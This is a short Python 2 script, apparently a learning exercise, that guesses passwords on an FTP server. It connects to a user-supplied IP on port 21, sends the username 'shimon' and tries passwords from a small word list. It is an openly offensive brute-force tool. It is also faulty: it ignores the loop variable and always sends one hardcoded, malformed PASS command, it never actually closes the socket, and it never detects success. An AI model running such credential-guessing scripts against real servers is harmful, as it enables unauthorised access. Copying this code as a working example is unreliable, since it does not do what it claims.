#!/usr/bin/python

from socket import *
ip = raw_input("Please Enter an ip address: ")

word = ["pass", "pass1", "kalivm2"]


for p in word:
	try:
		s = socket()
		#connecting  to the ftp server
		s.connect((ip, 21))
		#printing the banner
		print s.recv(2048)
		#sending the USER with the username
		s.send("USER shimon\n")
		#reciving it's output
		print s.recv(2048)
		#sending PASS with the password
		s.send("PASS" + "kalivm2\n")
		#reciving it's output
		s.recv(2048)

		s.close
	except:
		print "You are Banned"
